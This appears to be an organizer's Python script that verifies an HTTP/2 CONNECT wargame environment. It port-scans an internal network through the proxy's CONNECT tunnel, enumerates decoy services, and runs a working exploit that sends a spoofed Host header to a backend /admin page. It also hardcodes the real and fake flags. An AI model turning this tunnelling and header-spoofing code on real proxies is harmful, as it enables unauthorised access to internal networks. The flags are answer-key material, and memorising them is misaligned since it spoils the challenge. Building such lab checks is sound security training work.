#!/usr/bin/env python3
"""
Setup Verification Script for HTTP/2 CONNECT Wargame
For organizers to verify the challenge environment is working correctly
"""

import socket
import sys
import time

try:
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import ResponseReceived, DataReceived, StreamEnded
except ImportError:
    print("[!] h2 library not installed. Install with: pip install h2")
    sys.exit(1)


class Colors:
    """Terminal colors for pretty output"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def print_header(text):
    """Print section header"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.BLUE}{text}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'='*60}{Colors.RESET}\n")


def print_success(text):
    """Print success message"""
    print(f"{Colors.GREEN}[✓]{Colors.RESET} {text}")


def print_error(text):
    """Print error message"""
    print(f"{Colors.RED}[✗]{Colors.RESET} {text}")


def print_info(text):
    """Print info message"""
    print(f"{Colors.YELLOW}[*]{Colors.RESET} {text}")


def test_basic_connectivity(host='localhost', port=10000):
    """Test 1: Basic TCP connectivity to proxy"""
    print_info(f"Testing basic connectivity to {host}:{port}...")

    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.close()
        print_success("Proxy is reachable via TCP")
        return True
    except Exception as e:
        print_error(f"Cannot connect to proxy: {e}")
        return False


def test_http2_support(host='localhost', port=10000):
    """Test 2: HTTP/2 protocol support"""
    print_info("Testing HTTP/2 protocol support...")

    try:
        sock = socket.create_connection((host, port), timeout=5)
        config = H2Configuration(client_side=True, validate_outbound_headers=False)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # Receive SETTINGS frame
        data = sock.recv(65535)
        events = conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        sock.close()
        print_success("Proxy supports HTTP/2")
        return True
    except Exception as e:
        print_error(f"HTTP/2 test failed: {e}")
        return False


def scan_port(host, port, target_ip, target_port, timeout=2):
    """Scan a single port via CONNECT"""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        config = H2Configuration(client_side=True, validate_outbound_headers=False)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # SETTINGS
        data = sock.recv(65535)
        conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        # CONNECT
        stream_id = conn.get_next_available_stream_id()
        headers = [(':method', 'CONNECT'), (':authority', f'{target_ip}:{target_port}')]
        conn.send_headers(stream_id, headers, end_stream=False)
        sock.sendall(conn.data_to_send())

        # Check response
        data = sock.recv(65535)
        events = conn.receive_data(data)

        for event in events:
            if isinstance(event, ResponseReceived):
                for name, value in event.headers:
                    if name == b':status' and value == b'200':
                        sock.close()
                        return True

        sock.close()
        return False

    except Exception:
        return False


def test_port_scanning(host='localhost', port=10000):
    """Test 3: Port scanning internal network"""
    print_info("Scanning internal network 172.20.0.0/24 for services...")

    targets = [
        ('172.20.0.10', 8080, 'Backend'),
        ('172.20.0.15', 3000, 'Decoy1'),
        ('172.20.0.20', 8000, 'Decoy2'),
        ('172.20.0.25', 8888, 'Decoy3'),
    ]

    found = []
    for ip, port_num, name in targets:
        if scan_port(host, port, ip, port_num):
            found.append((ip, port_num, name))
            print_success(f"Found {name} at {ip}:{port_num}")
        else:
            print_error(f"Cannot reach {name} at {ip}:{port_num}")

    if len(found) == 4:
        print_success(f"All 4 services found via port scan")
        return True
    else:
        print_error(f"Only found {len(found)}/4 services")
        return False


def http_via_tunnel(host, port, target_ip, target_port, path='/'):
    """
    Send HTTP/1.1 request through CONNECT tunnel
    Returns response body as string
    """
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.settimeout(5)
        config = H2Configuration(client_side=True, validate_outbound_headers=False)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # SETTINGS exchange
        data = sock.recv(65535)
        conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        # CONNECT tunnel
        stream_id = conn.get_next_available_stream_id()
        headers = [(':method', 'CONNECT'), (':authority', f'{target_ip}:{target_port}')]
        conn.send_headers(stream_id, headers, end_stream=False)
        sock.sendall(conn.data_to_send())

        # Wait for CONNECT response
        data = sock.recv(65535)
        events = conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        tunnel_ok = False
        for event in events:
            if isinstance(event, ResponseReceived):
                for name, value in event.headers:
                    if name == b':status' and value == b'200':
                        tunnel_ok = True

        if not tunnel_ok:
            sock.close()
            return None

        # Send HTTP/1.1 request through tunnel using DATA frames
        http_request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\nConnection: close\r\n\r\n"
        conn.send_data(stream_id, http_request.encode(), end_stream=False)
        sock.sendall(conn.data_to_send())

        # Read HTTP response from DATA frames
        response_data = b''
        timeout_time = time.time() + 3

        while time.time() < timeout_time:
            try:
                data = sock.recv(65535)
                if not data:
                    break

                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, DataReceived) and event.stream_id == stream_id:
                        response_data += event.data
                        conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                    elif isinstance(event, StreamEnded) and event.stream_id == stream_id:
                        sock.close()
                        # Parse HTTP response
                        if b'\r\n\r\n' in response_data:
                            body = response_data.split(b'\r\n\r\n', 1)[1]
                            return body.decode('utf-8', errors='ignore')
                        return response_data.decode('utf-8', errors='ignore')

                sock.sendall(conn.data_to_send())

            except socket.timeout:
                break

        sock.close()

        # Parse response even if stream didn't end cleanly
        if b'\r\n\r\n' in response_data:
            body = response_data.split(b'\r\n\r\n', 1)[1]
            return body.decode('utf-8', errors='ignore')

        return response_data.decode('utf-8', errors='ignore')

    except Exception as e:
        return None


def test_service_enumeration(host='localhost', port=10000):
    """Test 4: Enumerate services to find real backend"""
    print_info("Enumerating services to identify backend...")

    services = [
        ('172.20.0.10', 8080, 'Backend'),
        ('172.20.0.15', 3000, 'Decoy1'),
        ('172.20.0.20', 8000, 'Decoy2'),
        ('172.20.0.25', 8888, 'Decoy3'),
    ]

    for target_ip, target_port, name in services:
        response = http_via_tunnel(host, port, target_ip, target_port, '/')
        if response:
            preview = response[:80].replace('\n', ' ')
            print_info(f"{name} ({target_ip}:{target_port}): {preview}...")
        else:
            print_error(f"Failed to enumerate {name}")

    print_success("Service enumeration complete")
    return True


def test_decoy_detection(host='localhost', port=10000):
    """Test 5: Verify decoys have fake/no flags"""
    print_info("Testing decoy services for fake flags...")

    # Test decoy2 (has fake flag)
    response = http_via_tunnel(host, port, '172.20.0.20', 8000, '/admin')

    if response and 'wrong_service_try_harder' in response:
        print_success("Decoy2 has fake flag (WSL{wrong_service_try_harder})")
        return True
    else:
        print_error("Decoy2 fake flag not found")
        if response:
            print_error(f"Response: {response[:200]}")
        return False


def test_exploit_flag_extraction(host='localhost', port=10000):
    """Test 6: Full exploit - extract real flag from backend"""
    print_info("Testing full exploit chain (real flag extraction)...")

    try:
        sock = socket.create_connection((host, port), timeout=10)
        sock.settimeout(10)
        config = H2Configuration(client_side=True, validate_outbound_headers=False)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # SETTINGS
        data = sock.recv(65535)
        conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        # CONNECT to backend
        stream_id = conn.get_next_available_stream_id()
        headers = [(':method', 'CONNECT'), (':authority', '172.20.0.10:8080')]
        conn.send_headers(stream_id, headers, end_stream=False)
        sock.sendall(conn.data_to_send())

        # Wait for CONNECT response
        data = sock.recv(65535)
        events = conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        # Send HTTP/1.1 request with spoofed Host header through tunnel
        http_request = "GET /admin HTTP/1.1\r\nHost: internal.acme.corp\r\nConnection: close\r\n\r\n"
        conn.send_data(stream_id, http_request.encode(), end_stream=False)
        sock.sendall(conn.data_to_send())

        # Read response
        response_data = b''
        timeout_time = time.time() + 5

        while time.time() < timeout_time:
            try:
                data = sock.recv(65535)
                if not data:
                    break

                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, DataReceived) and event.stream_id == stream_id:
                        response_data += event.data
                        conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                    elif isinstance(event, StreamEnded) and event.stream_id == stream_id:
                        sock.close()
                        if b'WSL{http2_authority_header_confusion}' in response_data:
                            print_success("Real flag extracted: WSL{http2_authority_header_confusion}")
                            return True

                sock.sendall(conn.data_to_send())

            except socket.timeout:
                break

        sock.close()

        # Check for flag even if stream didn't end cleanly
        if b'WSL{http2_authority_header_confusion}' in response_data:
            print_success("Real flag extracted: WSL{http2_authority_header_confusion}")
            return True
        else:
            print_error("Real flag not found in response")
            body = response_data.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in response_data else response_data
            print_error(f"Response: {body.decode('utf-8', errors='ignore')[:200]}")
            return False

    except Exception as e:
        print_error(f"Exploit test failed: {e}")
        import traceback
        traceback.print_exc()
        return False


def main():
    """Run all verification tests"""
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}HTTP/2 CONNECT Wargame - Setup Verification{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")

    print_info("This script verifies that the challenge environment is set up correctly.")
    print_info("Make sure Docker containers are running: docker-compose up -d\n")

    results = []

    # Test 1: Basic Connectivity
    print_header("Test 1: Basic Connectivity")
    results.append(("Basic Connectivity", test_basic_connectivity()))

    # Test 2: HTTP/2 Support
    print_header("Test 2: HTTP/2 Support")
    results.append(("HTTP/2 Support", test_http2_support()))

    # Test 3: Port Scanning
    print_header("Test 3: Internal Network Port Scan")
    results.append(("Port Scanning", test_port_scanning()))

    # Test 4: Service Enumeration
    print_header("Test 4: Service Enumeration")
    results.append(("Service Enumeration", test_service_enumeration()))

    # Test 5: Decoy Detection
    print_header("Test 5: Decoy Detection")
    results.append(("Decoy Detection", test_decoy_detection()))

    # Test 6: Full Exploit
    print_header("Test 6: Full Exploit (Flag Extraction)")
    results.append(("Flag Extraction", test_exploit_flag_extraction()))

    # Summary
    print_header("Test Summary")
    passed = sum(1 for _, result in results if result)
    total = len(results)

    for test_name, result in results:
        status = f"{Colors.GREEN}PASS{Colors.RESET}" if result else f"{Colors.RED}FAIL{Colors.RESET}"
        print(f"  {test_name}: {status}")

    print(f"\n{Colors.BOLD}Results: {passed}/{total} tests passed{Colors.RESET}\n")

    if passed == total:
        print_success("All tests passed! Challenge is ready.")
        return 0
    else:
        print_error(f"{total - passed} test(s) failed. Check configuration.")
        return 1


if __name__ == '__main__':
    sys.exit(main())
